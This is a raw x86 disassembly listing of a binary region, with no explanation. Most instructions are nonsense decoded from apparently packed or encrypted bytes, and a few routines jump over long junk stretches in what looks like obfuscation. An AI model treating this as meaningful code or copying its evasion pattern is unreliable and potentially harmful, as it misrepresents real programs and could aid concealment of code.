  40faa9:	int3   
  40faaa:	lods   al,BYTE PTR ds:[esi]
  40faab:	inc    esi
  40faac:	aaa    
  40faad:	out    dx,al
  40faae:	addr16 popf 
  40fab0:	mov    DWORD PTR [eax-0x43dd885d],ebp
  40fab6:	or     BYTE PTR [ecx+0x8c01dd9],bh
  40fabc:	out    0xd5,eax
  40fabe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fabf:	fcmove st,st(6)
  40fac1:	pusha  
  40fac2:	cmp    BYTE PTR [edi-0x6d],0x20
  40fac6:	add    eax,0xd245277a
  40facb:	push   ebp
  40facc:	lods   al,BYTE PTR ds:[esi]
  40facd:	js     0x40fac8
  40facf:	inc    eax
  40fad0:	inc    eax
  40fad1:	lds    eax,FWORD PTR [edi+0x39040e3e]
  40fad7:	retf   
  40fad8:	(bad)  [edi-0x2ed76ef0]
  40fade:	retf   0x61e6
  40fae1:	aas    
  40fae2:	ror    esi,0xbe
  40fae5:	inc    esp
  40fae6:	inc    ebp
  40fae7:	pop    ebp
  40fae8:	push   ss
  40fae9:	xchg   BYTE PTR ds:0xc9179da9,ah
  40faef:	(bad)  [eax+ecx*8+0x32]
  40faf3:	outs   dx,DWORD PTR ds:[esi]
  40faf4:	je     0x40fb72
  40faf6:	cmp    cl,BYTE PTR [edi]
  40faf8:	mov    ds:0x70383427,al
  40fafd:	push   cs
  40fafe:	adc    DWORD PTR [ebp-0x3f],0x88a9af53
  40fb05:	dec    ebx
  40fb06:	(bad)  
  40fb07:	push   ss
  40fb08:	aam    0x5d
  40fb0a:	or     esi,esi
  40fb0c:	mov    ds:0x756b0385,al
  40fb11:	push   ds
  40fb12:	inc    ebp
  40fb13:	out    dx,al
  40fb14:	clc    
  40fb15:	fmul   DWORD PTR [edi-0x6e191d6e]
  40fb1b:	pop    ss
  40fb1c:	stos   BYTE PTR es:[edi],al
  40fb1d:	xor    esp,DWORD PTR [edi+0x5c]
  40fb20:	mov    eax,ds:0x3df8d5ad
  40fb25:	stos   BYTE PTR es:[edi],al
  40fb26:	and    DWORD PTR [ecx],ebp
  40fb28:	jecxz  0x40fb2a
  40fb2a:	dec    ebx
  40fb2b:	cmc    
  40fb2c:	outs   dx,BYTE PTR ds:[esi]
  40fb2d:	xchg   DWORD PTR [ecx-0x5a],eax
  40fb30:	push   ds
  40fb31:	std    
  40fb32:	ss aaa 
  40fb34:	cwde   
  40fb35:	xlat   BYTE PTR ds:[ebx]
  40fb36:	mov    edx,0x8dfa8d3b
  40fb3b:	int    0x31
  40fb3d:	stc    
  40fb3e:	sbb    esp,edx
  40fb40:	push   ebp
  40fb41:	xor    al,0x46
  40fb43:	xchg   edi,eax
  40fb44:	fld1   
  40fb46:	out    0xa2,al
  40fb48:	in     al,dx
  40fb49:	imul   esi,DWORD PTR [edi+esi*8-0x3708bc28],0x2fd783b6
  40fb54:	jns    0x40fb01
  40fb56:	rcr    DWORD PTR [ebp+0x16],cl
  40fb59:	mov    cl,0xcd
  40fb5b:	xor    BYTE PTR [esp+eiz*8-0xb45e604],dl
  40fb62:	icebp  
  40fb63:	out    0xf,eax
  40fb65:	lods   eax,DWORD PTR ds:[esi]
  40fb66:	(bad)  
  40fb67:	xor    DWORD PTR [esi-0x3b6b67c4],edi
  40fb6d:	jae    0x40fb06
  40fb6f:	lods   al,BYTE PTR ds:[esi]
  40fb70:	sbb    eax,0x5d20a7c6
  40fb75:	push   eax
  40fb76:	hlt    
  40fb77:	pop    ebp
  40fb78:	mov    eax,0x49b5bbb7
  40fb7d:	das    
  40fb7e:	pop    edi
  40fb7f:	popa   
  40fb80:	sbb    eax,ebx
  40fb82:	ficom  WORD PTR [edi+edx*8-0x7d415e8]
  40fb89:	std    
  40fb8a:	(bad)  
  40fb8b:	jmp    0x40fb48
  40fb8d:	xor    edx,ebx
  40fb8f:	(bad)  
  40fb90:	cmc    
  40fb91:	dec    ebx
  40fb92:	addr16 inc eax
  40fb94:	push   0x9f324092
  40fb99:	mov    dl,0x0
  40fb9b:	mov    ds:0x94577d6d,eax
  40fba0:	or     esi,edx
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0x1e
  40fbc9:	and    edi,DWORD PTR [esi+0x7eb6d0ea]
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fbf9
  40fbd5:	mov    BYTE PTR [esi+0x5a],dl
  40fbd8:	xchg   ch,cl
  40fbda:	xchg   DWORD PTR [ecx+0x6],eax
  40fbdd:	push   es
  40fbde:	ins    DWORD PTR es:[edi],dx
  40fbdf:	cs addr16 (bad) 
  40fbe2:	ds push cs
  40fbe4:	punpckhbw xmm4,xmm1
  40fbe8:	into   
  40fbe9:	mov    esp,ebx
  40fbeb:	mov    ds:0xe20cf699,eax
  40fbf0:	push   cs
  40fbf1:	sahf   
  40fbf2:	mov    ds:0x8b2b2fc8,eax
  40fbf7:	neg    dh
  40fbf9:	dec    esp
  40fbfa:	int    0xb1
  40fbfc:	mov    ecx,0x56e8ba41
  40fc01:	sbb    al,0xd2
  40fc03:	fld    QWORD PTR [edi+0x53]
  40fc06:	adc    bl,BYTE PTR [edi+0x3f4186be]
  40fc0c:	pop    edx
  40fc0d:	outs   dx,BYTE PTR ds:[esi]
  40fc0e:	imul   eax,eax,0x9
  40fc11:	xchg   di,cx
  40fc14:	mov    ebx,0x444875c5
  40fc19:	xchg   edx,eax
  40fc1a:	jge    0x40fbf5
  40fc1c:	push   edx
  40fc1d:	sbb    BYTE PTR [esi-0x20ac1b6b],bh
  40fc23:	mov    edx,0x88721f83
  40fc28:	paddsb mm2,QWORD PTR [ebx+0x3c]
  40fc2c:	mov    ebp,0x147734d1
  40fc31:	inc    edx
  40fc32:	inc    ebx
  40fc33:	jnp    0x40fc7b
  40fc35:	xchg   edi,eax
  40fc36:	or     esp,esi
  40fc38:	inc    ecx
  40fc39:	clc    
  40fc3a:	sub    DWORD PTR [eax+0x7cefbecb],esi
  40fc40:	xor    DWORD PTR [ebp-0x19ca66be],edi
  40fc46:	in     al,0x5c
  40fc48:	xchg   esp,eax
  40fc49:	std    
  40fc4a:	out    0x76,al
  40fc4c:	pop    esi
  40fc4d:	add    al,0x72
  40fc4f:	js     0x40fc0c
  40fc51:	cmp    BYTE PTR ds:0xf5c854d8,ah
  40fc57:	out    dx,eax
  40fc58:	cli    
  40fc59:	enter  0x4efd,0x80
  40fc5d:	dec    edx
  40fc5e:	xchg   edx,eax
  40fc5f:	adc    al,BYTE PTR [eax+0x2d1ab205]
  40fc65:	test   DWORD PTR [ecx+eiz*4],ebx
  40fc68:	xor    al,BYTE PTR [esi+0x44]
  40fc6b:	pop    esi
  40fc6c:	jg     0x40fc05
  40fc6e:	pop    esp
  40fc6f:	push   0xa3a56811
  40fc74:	cs mov cl,0x29
  40fc77:	ds clc 
  40fc79:	xor    al,0x53
  40fc7b:	and    al,0xf
  40fc7d:	dec    ebp
  40fc7e:	inc    ebp
  40fc7f:	mov    dl,BYTE PTR [edi+0x391163d]
  40fc85:	outs   dx,DWORD PTR ds:[esi]
  40fc86:	in     eax,dx
  40fc87:	sbb    ch,BYTE PTR [ecx-0x7cac9611]
  40fc8d:	rcl    ch,1
  40fc8f:	fistp  DWORD PTR [ecx-0x45339768]
  40fc95:	sti    
  40fc96:	iret   
  40fc97:	add    ecx,DWORD PTR [ebx]
  40fc99:	and    BYTE PTR [ebx+0x0],ah
  40fc9c:	std    
  40fc9d:	cmp    BYTE PTR [esi+0x79b450bd],0xce
  40fca4:	push   ds
  40fca5:	cmp    eax,0x254f2c69
  40fcaa:	(bad)  
  40fcab:	xor    ch,BYTE PTR [ebx+0x47]
  40fcae:	mov    edx,?
  40fcb0:	sbb    al,0x24
  40fcb2:	(bad)  
  40fcb3:	dec    edx
  40fcb4:	xor    al,0x6a
  40fcb6:	xchg   ecx,eax
  40fcb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcb8:	push   ss
  40fcb9:	adc    al,0x8
  40fcbb:	mov    ds:0xc1161caf,al
  40fcc0:	jae    0x40fc54
  40fcc2:	fpatan 
  40fcc4:	adc    eax,0x97defde1
  40fcc9:	add    edi,0x50dcac30
  40fccf:	push   edx
  40fcd0:	sahf   
  40fcd1:	xchg   ebp,eax
  40fcd2:	js     0x40fc61
  40fcd4:	mov    ecx,0x3d2f8431
  40fcd9:	(bad)  
  40fcda:	jne    0x40fd3b
  40fcdc:	mov    edx,0xad0ecc22
  40fce1:	add    DWORD PTR [esi-0x6405d89e],esi
  40fce7:	gs jecxz 0x40fce8
  40fcea:	sbb    eax,DWORD PTR [esi+0x470b9b7a]
  40fcf0:	in     al,0x16
  40fcf2:	pop    edi
  40fcf3:	(bad)  
  40fcf4:	outs   dx,BYTE PTR ds:[esi]
  40fcf5:	shl    BYTE PTR [ebp+eax*4+0x79],cl
  40fcf9:	test   eax,0x74c840d9
  40fcfe:	cs cs xchg ecx,eax
  40fd01:	fsubr  st,st(4)
  40fd03:	mov    eax,0xca0eb3ae
  40fd08:	int3   
  40fd09:	mov    eax,0x54b358f0
  40fd0e:	inc    esi
  40fd0f:	lds    esi,FWORD PTR [ebp+0x66]
  40fd12:	repnz xchg esi,eax
  40fd14:	call   0xeb5bad67
  40fd19:	(bad)  [ebp+0x1b]
  40fd1c:	inc    esp
  40fd1d:	lods   eax,DWORD PTR ds:[esi]
  40fd1e:	int3   
  40fd1f:	cmp    DWORD PTR [ebp+0x71363da2],0x6b
  40fd26:	out    0x6c,al
  40fd28:	or     BYTE PTR [ebx-0x321a9351],bh
  40fd2e:	enter  0xd73b,0xd9
  40fd32:	mul    DWORD PTR ds:[edi-0x4]
  40fd36:	inc    esi
  40fd37:	mov    ds,WORD PTR [edx+ebx*1+0x4e]
  40fd3b:	test   DWORD PTR [edx+edi*4+0x771f8962],ebp
  40fd42:	je     0x40fd79
  40fd44:	push   ss
  40fd45:	and    ch,BYTE PTR ds:0x52351b54
  40fd4b:	std    
  40fd4c:	loope  0x40fd3a
  40fd4e:	push   ebp
  40fd4f:	lds    eax,FWORD PTR [ebx]
  40fd51:	fisttp DWORD PTR [ebx-0x4c782a74]
  40fd57:	dec    ebp
  40fd58:	in     al,0x74
  40fd5a:	push   ss
  40fd5b:	stos   BYTE PTR es:[edi],al
  40fd5c:	(bad)  [ecx+eax*1-0x65]
  40fd60:	lods   al,BYTE PTR ds:[esi]
  40fd61:	(bad)  [edi]
  40fd63:	cmp    ebx,DWORD PTR [edx+0x5d]
  40fd66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd67:	lahf   
  40fd68:	adc    al,0x38
  40fd6a:	loope  0x40fdcb
  40fd6c:	imul   ebx,DWORD PTR [edx-0x4e],0xffffffc9
  40fd70:	sbb    BYTE PTR [ebp-0x54],0x4b
  40fd74:	call   0x2d9e053
  40fd79:	adc    BYTE PTR [edx+0x2a],ch
  40fd7c:	mov    BYTE PTR [ebx],dl
  40fd7e:	push   ecx
  40fd7f:	popa   
  40fd80:	idiv   DWORD PTR [edi-0x3a]
  40fd83:	push   0x6f
  40fd85:	cmp    ecx,esp
  40fd87:	inc    esi
  40fd88:	sar    DWORD PTR [esi+0x7874829c],0x1f
  40fd8f:	mov    dl,0x88
  40fd91:	inc    esi
  40fd92:	and    eax,0xcc488e45
  40fd97:	mov    ch,0x8b
  40fd99:	popa   
  40fd9a:	xlat   BYTE PTR ds:[ebx]
  40fd9b:	adc    dh,BYTE PTR [ebx+0x16]
  40fd9e:	js     0x40fd60
  40fda0:	mov    DWORD PTR [ebx-0x462c4dce],ebp
  40fda6:	(bad)  
  40fda8:	push   esp
  40fda9:	mov    cs,WORD PTR [edi+0x13817d4c]
  40fdaf:	ficomp WORD PTR [eax-0x672993fb]
  40fdb5:	jne    0x40fd89
  40fdb7:	or     eax,0x7ea7cdbd
  40fdbc:	js     0x40fd41
  40fdbe:	loopne 0x40fe08
  40fdc0:	shl    DWORD PTR [edi+ebp*2-0x26],cl
  40fdc4:	in     eax,0x87
  40fdc6:	inc    ebp
  40fdc7:	sub    al,0xb2
  40fdc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdca:	sbb    eax,0x4facf5f3
  40fdcf:	jecxz  0x40fe41
  40fdd1:	outs   dx,DWORD PTR ds:[esi]
  40fdd2:	sub    dh,BYTE PTR [ecx-0x23]
  40fdd5:	mov    dl,0x81
  40fdd7:	jp     0x40fd86
  40fdd9:	sub    DWORD PTR [esi+0x2c3300d9],ecx
  40fddf:	sbb    DWORD PTR [eax+ebp*4+0x3137c122],0x47e06630
  40fdea:	iret   
  40fdeb:	les    ecx,FWORD PTR [esi-0x791ddccd]
  40fdf1:	adc    al,0x6
  40fdf3:	pop    esi
  40fdf4:	aad    0xf6
  40fdf6:	scas   al,BYTE PTR es:[edi]
  40fdf7:	icebp  
  40fdf8:	clc    
  40fdf9:	sbb    ebx,DWORD PTR [esp+eax*1+0x24]
  40fdfd:	pop    ss
  40fdfe:	pop    es
  40fdff:	shr    ebp,0xf7
  40fe02:	and    eax,0x2cf4bc21
  40fe07:	push   eax
  40fe08:	mov    ah,BYTE PTR [eax+0x66]
  40fe0b:	mov    WORD PTR [eax],gs
  40fe0d:	or     BYTE PTR [edi+edx*8+0x76],cl
  40fe11:	outs   dx,DWORD PTR ds:[esi]
  40fe12:	mov    cl,BYTE PTR [esi-0x5f275058]
  40fe18:	push   ebp
  40fe19:	rcl    DWORD PTR [esi+ebx*4],0x31
  40fe1d:	div    DWORD PTR [edi]
  40fe1f:	imul   edi,DWORD PTR [eax],0x41
  40fe22:	lea    eax,[eax+0x32]
  40fe25:	adc    ebx,DWORD PTR [edi]
  40fe27:	data16 das 
  40fe29:	cmp    eax,0x570522fd
  40fe2e:	shl    BYTE PTR [ecx+0x1c],0x22
  40fe32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe33:	scas   eax,DWORD PTR es:[edi]
  40fe34:	inc    bp
  40fe36:	(bad)  
  40fe37:	sti    
  40fe38:	scas   eax,DWORD PTR es:[edi]
  40fe39:	dec    ebp
  40fe3a:	aaa    
  40fe3b:	test   al,0x5d
  40fe3d:	xchg   esp,eax
  40fe3e:	xchg   esp,eax
  40fe3f:	mov    eax,0xbd2a1764
  40fe44:	test   DWORD PTR [edx-0xc1e7993],eax
  40fe4a:	shl    DWORD PTR [edx],cl
  40fe4c:	fisubr WORD PTR [bp+si]
  40fe4f:	sahf   
  40fe50:	mov    eax,ds:0x8781a3f7
  40fe55:	jo     0x40fe2b
  40fe57:	and    edx,edx
  40fe59:	inc    edi
  40fe5a:	add    BYTE PTR [esi],dl
  40fe5c:	ror    DWORD PTR [edx+eax*2-0x79c1587a],1
  40fe63:	mov    ebp,0x2ca3ab06
  40fe68:	mov    ch,0xc1
  40fe6a:	std    
  40fe6b:	xor    ebp,DWORD PTR [ebp-0x14754b7]
  40fe71:	sub    DWORD PTR [ecx-0x3d],0x63541344
  40fe78:	call   0x84a0:0x5bb37a54
  40fe7f:	aaa    
  40fe80:	popf   
  40fe81:	cmp    BYTE PTR [ebx],ah
  40fe83:	cmp    DWORD PTR [esi+0x74a5c52c],0x57
  40fe8a:	div    DWORD PTR [edi]
  40fe8c:	scas   eax,DWORD PTR es:[edi]
  40fe8d:	cmp    BYTE PTR [esi-0x4be9a39],ch
  40fe93:	scas   eax,DWORD PTR es:[edi]
  40fe94:	mov    ah,0x7e
  40fe96:	mov    ds,WORD PTR [esi+0xc4b9ff9]
  40fe9c:	lds    esp,FWORD PTR [ecx]
  40fe9e:	(bad)  
  40fe9f:	cmc    
  40fea0:	lea    eax,ds:0xcf5db962
  40fea6:	in     al,dx
  40fea7:	ss stos DWORD PTR es:[edi],eax
  40fea9:	and    dl,ah
  40feab:	pop    ecx
  40feac:	cmp    esi,esp
  40feae:	cwde   
  40feaf:	push   es
  40feb0:	std    
  40feb1:	sub    ah,al
  40feb3:	fwait
  40feb4:	ror    BYTE PTR [ebx-0x1c44c414],cl
  40feba:	jge    0x40ff36
  40febc:	cmp    eax,0xfa91f3ed
  40fec1:	xor    ah,bh
  40fec3:	aaa    
  40fec4:	cmp    al,0x6b
  40fec6:	pop    edx
  40fec7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fec8:	mov    bl,0xbc
  40feca:	jle    0x40fe66
  40fecc:	mov    esi,0x1d03abbd
  40fed1:	inc    ebp
  40fed2:	arpl   dx,dx
  40fed4:	pop    eax
  40fed5:	retf   
  40fed6:	mov    eax,DWORD PTR [ebp+0xc]
  40fed9:	xor    edx,edx
  40fedb:	mov    ecx,0x7264fca9
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x550c4346
  40fef3:	jns    0x40ff64
  40fef5:	fidiv  WORD PTR [ebp+0x7d7c7e7e]
  40fefb:	jle    0x40ff7b
  40fefd:	jecxz  0x40fee3
  40feff:	repz and ecx,DWORD PTR [ecx+0x77]
  40ff03:	(bad)  [ecx+0x6f]
  40ff06:	enter  0xeaad,0xde
  40ff0a:	mov    edi,0x410aadd9
  40ff0f:	mov    esi,fs
  40ff11:	outs   dx,DWORD PTR ds:[esi]
  40ff12:	jmp    0x40fef8
  40ff14:	jbe    0x40fee6
  40ff16:	fwait
  40ff17:	pop    es
  40ff18:	inc    ecx
  40ff19:	pop    ebx
  40ff1a:	jae    0x40fecb
  40ff1c:	xlat   BYTE PTR ds:[ebx]
  40ff1d:	xchg   BYTE PTR [ecx],ah
  40ff1f:	(bad)  
  40ff20:	push   ecx
  40ff21:	jb     0x40ff91
  40ff23:	mov    ds:0x529f3dd8,al
  40ff28:	cmp    esi,DWORD PTR [ebp+0x54]
  40ff2b:	pop    ecx
  40ff2c:	shr    DWORD PTR [eax],1
  40ff2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff2f:	cmp    al,0x91
  40ff31:	xor    eax,0x22638bd1
  40ff36:	or     al,0x33
  40ff38:	arpl   ax,si
  40ff3a:	sub    bh,BYTE PTR [esi+0x7e]
  40ff3d:	aam    0xe7
  40ff3f:	sub    BYTE PTR [ebx],dh
  40ff41:	in     eax,dx
  40ff42:	jb     0x40ff68
  40ff44:	and    BYTE PTR [esi+0x6d8dc55b],dh
  40ff4a:	and    DWORD PTR [edi],ebx
  40ff4c:	mov    ch,0x25
  40ff4e:	daa    
  40ff4f:	push   cs
  40ff50:	rcr    cl,0x84
  40ff53:	jge    0x40ff7a
  40ff55:	(bad)  
  40ff56:	xchg   bl,ch
  40ff58:	mov    eax,0x69c467f5
  40ff5d:	adc    bh,BYTE PTR [ebp-0xf]
  40ff60:	imul   edi,DWORD PTR [esi-0x8d76b68],0x8efc01f8
  40ff6a:	repz imul edi,DWORD PTR [ebx+eax*8-0x24],0xfffffff9
  40ff70:	bound  edi,QWORD PTR [eax]
  40ff72:	mov    bl,0xb1
  40ff74:	in     eax,0x45
  40ff76:	fld    DWORD PTR ds:0x14845373
  40ff7c:	jmp    0x40ff8e
  40ff7e:	ja     0x40ff3d
  40ff80:	rcr    ebp,1
  40ff82:	ret    
  40ff83:	ins    BYTE PTR es:[edi],dx
  40ff84:	jmp    0x40ffd3
  40ff86:	pusha  
  40ff87:	sbb    BYTE PTR [eax],0x79
  40ff8a:	add    ah,BYTE PTR [ebx+edi*8]
  40ff8d:	xor    ebx,edx
  40ff8f:	pop    ebx
  40ff90:	adc    al,0x1f
  40ff92:	and    BYTE PTR [esi+eax*2-0x77],bh
  40ff96:	ss add ecx,ebx
  40ff99:	(bad)  
  40ff9a:	lods   eax,DWORD PTR ds:[esi]
  40ff9b:	xor    eax,0xd3d8b44b
  40ffa0:	hlt    
  40ffa1:	sbb    cl,ch
  40ffa3:	or     eax,0xc965a3ee
  40ffa8:	cli    
  40ffa9:	sbb    al,0x5a
  40ffab:	or     BYTE PTR [edi-0x7b],dl
  40ffae:	pop    ds
  40ffaf:	push   edi
  40ffb0:	jae    0x40ffc2
  40ffb2:	(bad)  
  40ffb4:	test   BYTE PTR [ecx+edi*2-0x6],dh
  40ffb8:	or     BYTE PTR [edx+0x52427fa],0x34
  40ffbf:	inc    eax
  40ffc0:	jb     0x40ff7f
  40ffc2:	rcr    BYTE PTR [edi],0x38
  40ffc5:	icebp  
  40ffc6:	imul   ecx,DWORD PTR [edi-0x332ce47f],0x4ae84a2d
  40ffd0:	out    dx,al
  40ffd1:	loop   0x41000b
  40ffd3:	pop    ds
  40ffd4:	adc    DWORD PTR ds:0x91f98049,ebp
  40ffda:	test   DWORD PTR [ebp-0xf619f55],0xb4ec92ad
  40ffe4:	stos   BYTE PTR es:[edi],al
  40ffe5:	aas    
  40ffe6:	adc    bh,BYTE PTR [ebx]
  40ffe8:	mov    ecx,0x49df9d98
  40ffed:	sub    BYTE PTR [ecx+0x2e0d3d13],cl
  40fff3:	clc    
  40fff4:	sbb    al,0x5
  40fff6:	mov    eax,0x4177eab0
  40fffb:	cmp    edi,DWORD PTR [eax-0x3e0f2c36]
  410001:	adc    eax,0xb3f9445e
  410006:	sbb    ebx,DWORD PTR fs:[eax-0x28563264]
  41000d:	arpl   WORD PTR [eax],sp
  41000f:	bswap  ebp
  410011:	lea    esi,[ecx-0x6b8e367c]
  410017:	outs   dx,DWORD PTR ds:[esi]
  410018:	repnz loop 0x41008c
  41001b:	sbb    eax,0x4db3da3a
  410020:	sbb    DWORD PTR [ebp+0x51],ebp
  410023:	shl    ebp,cl
  410025:	cmp    edx,edi
  410027:	xor    al,BYTE PTR [ebx+esi*8]
  41002a:	pop    esp
  41002b:	les    eax,FWORD PTR [edx]
  41002d:	mov    ds:0x510cfb7b,eax
  410032:	loop   0x40ffd4
  410034:	out    dx,al
  410035:	std    
  410036:	mov    esp,0xd04888d9
  41003b:	jmp    0xc014945d
  410040:	ret    0x9dd2
  410043:	jno    0x410026
  410045:	jl     0x410014
  410047:	in     al,0xc2
  410049:	xlat   BYTE PTR ds:[ebx]
  41004a:	mov    al,ds:0x516136ca
  41004f:	fucomi st,st(6)
  410051:	fistp  WORD PTR [edi]
  410053:	repnz or eax,0x2fb09600
  410059:	mov    es,WORD PTR [esi+0x2c0f9b92]
  41005f:	pop    eax
  410060:	or     al,0x5f
  410062:	das    
  410063:	sbb    al,0x21
  410065:	jmp    0x4100e6
  410067:	mov    ah,0x1f
  410069:	mov    esi,0xe1c3c9b5
  41006e:	cli    
  41006f:	push   es
  410070:	cld    
  410071:	ret    
  410072:	loop   0x4100b0
  410074:	xor    dh,0xcd
  410077:	inc    eax
  410078:	mov    WORD PTR [edi+0x7d],gs
  41007b:	and    cl,0x47
  41007e:	repnz fidivr DWORD PTR [esi+0x8]
  410082:	jl     0x4100e4
  410084:	out    dx,al
  410085:	aas    
  410086:	pop    ebx
  410087:	add    ch,BYTE PTR [edi]
  410089:	push   esp
  41008a:	outs   dx,DWORD PTR ds:[esi]
  41008b:	sub    eax,0xff9417e2
  410090:	dec    ebx
  410091:	out    dx,eax
  410092:	inc    ebx
  410093:	mov    dl,0x77
  410095:	xchg   esp,eax
  410096:	and    al,al
  410098:	dec    ebx
  410099:	cdq    
  41009a:	push   edx
  41009b:	inc    ecx
  41009c:	mov    eax,ecx
  41009e:	inc    eax
  41009f:	xor    DWORD PTR fs:[edx-0x3f16d9e0],ebx
  4100a6:	mov    bh,0x55
  4100a8:	adc    BYTE PTR [esi],dl
  4100aa:	sbb    esi,DWORD PTR [edi]
  4100ac:	xchg   ecx,eax
  4100ad:	mov    bh,0x48
  4100af:	or     al,0x85
  4100b1:	push   0x40815876
  4100b6:	daa    
  4100b7:	add    eax,0x97bdafca
  4100bc:	lahf   
  4100bd:	mov    bh,0x2
  4100bf:	push   edi
  4100c0:	cmp    al,0x4c
  4100c2:	pop    ebx
  4100c3:	loope  0x4100d2
  4100c5:	dec    ebx
  4100c6:	mov    ebp,0xaa6e05ba
  4100cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100cc:	fstp   DWORD PTR [ebx]
  4100ce:	jbe    0x4100fa
  4100d0:	push   ecx
  4100d1:	sbb    al,0xd0
  4100d3:	leave  
  4100d4:	xor    DWORD PTR [ecx+edx*2],0x1695a7d1
  4100db:	push   ecx
  4100dc:	dec    edi
  4100dd:	lock mov al,ss:0xa3f577cb
  4100e4:	cld    
  4100e5:	lods   eax,DWORD PTR ds:[esi]
  4100e6:	and    al,0x1f
  4100e8:	pop    es
  4100e9:	mov    dl,0x94
  4100eb:	jbe    0x4100e3
  4100ed:	lods   eax,DWORD PTR ds:[esi]
  4100ee:	add    al,0xaf
  4100f0:	fstp   DWORD PTR [edi-0x45]
  4100f3:	sbb    edx,DWORD PTR [eax+0x18]
  4100f6:	sbb    edx,DWORD PTR [eax+ebp*1-0x46]
  4100fa:	je     0x41012a
  4100fc:	jmp    0xeeb23c56
  410101:	dec    ecx
  410102:	(bad)  
  410104:	push   ebp
  410105:	mov    eax,0x832b7cdb
  41010a:	adc    al,0x57
  41010c:	sbb    eax,0xb1169c2c
  410111:	xchg   BYTE PTR [ebx+0x47],bh
  410114:	test   dh,dh
  410116:	push   0x7c1e3903
  41011b:	cmc    
  41011c:	xor    ebp,0x27
  41011f:	(bad)
  410122:	mov    esp,DWORD PTR [ebx+0x18c6d082]
  410128:	fs dec edi
  41012a:	test   DWORD PTR [esp+ecx*1-0x53f4874b],0x62a5f0cd
  410135:	inc    esp
  410136:	jg     0x4100e0
  410138:	cmp    ecx,DWORD PTR [edx]
  41013a:	imul   ebp,DWORD PTR [edi-0x22db3dc3],0x6d
  410141:	dec    ecx
  410142:	lock fwait
  410144:	jmp    0x6548:0xe115c548
  41014b:	pop    ebx
  41014c:	xchg   DWORD PTR [esi+esi*1-0x205362c7],esi
  410153:	retf   0xe3ff
  410156:	(bad)  
  410157:	jae    0x410129
  410159:	mov    ds,WORD PTR [ecx+0x75]
  41015c:	pop    edx
  41015d:	xchg   ecx,eax
  41015e:	(bad)  
  41015f:	mov    cl,0x73
  410161:	cmp    DWORD PTR [edx],0xa
  410164:	adc    al,0x49
  410166:	xor    ebx,ebp
  410168:	xchg   ecx,eax
  410169:	stos   BYTE PTR es:[edi],al
  41016a:	adc    eax,0x2e8fa4ec
  41016f:	mov    dl,0xd4
  410171:	or     ch,BYTE PTR [edx-0xb]
  410174:	sbb    esp,DWORD PTR [ebp-0x5]
  410177:	or     dh,cl
  410179:	xchg   ebp,eax
  41017a:	sbb    DWORD PTR [edi-0x38556816],0x5253d3b
  410184:	test   DWORD PTR ds:0x6be59a3b,0xf79cc9c5
  41018e:	cmp    BYTE PTR [ecx-0x3a],ch
  410191:	loop   0x4101d5
  410193:	popf   
  410194:	loope  0x4101fd
  410196:	in     al,dx
  410197:	(bad)
  41019a:	jno    0x4101f8
  41019c:	jmp    0xd737:0x26a48d8d
  4101a3:	popa   
  4101a4:	jp     0x410176
  4101a6:	xchg   esp,eax
  4101a7:	in     al,0x9c
  4101a9:	mov    esp,0xcaf05952
  4101ae:	jnp    0x4101b3
  4101b0:	push   eax
  4101b1:	repz or ebp,ebx
  4101b4:	jp     0x410213
  4101b6:	and    eax,0x81f8ae63
  4101bb:	mov    bh,0xf
  4101bd:	lods   al,BYTE PTR fs:[esi]
  4101bf:	and    DWORD PTR [ebx*8+0x645014ed],esi
  4101c6:	sahf   
  4101c7:	fst    st(2)
  4101c9:	lds    edx,FWORD PTR [eax+eiz*4-0x21ac10ff]
  4101d0:	aad    0x6e
  4101d2:	sahf   
  4101d3:	retf   0xaa8d
  4101d6:	in     al,0xef
  4101d8:	mov    eax,0x3579fae0
  4101dd:	and    esp,DWORD PTR [esi]
  4101df:	xchg   ecx,eax
  4101e0:	scas   eax,DWORD PTR es:[edi]
  4101e1:	shl    DWORD PTR [esi-0x436f5913],1
  4101e7:	(bad)  
  4101e8:	fs fs fwait
  4101eb:	pop    edx
  4101ec:	push   0xffffff9d
  4101ee:	mov    esp,0x550570cb
  4101f3:	cmc    
  4101f4:	cmp    BYTE PTR [ebp+0x3f],dl
  4101f7:	jae    0x410195
  4101f9:	xor    eax,edx
  4101fb:	jle    0x4101af
  4101fd:	dec    edi
  4101fe:	in     al,dx
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43369f
  41021e:	adc    DWORD PTR ds:0x4336d7,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43360b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x43372b,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x4336df
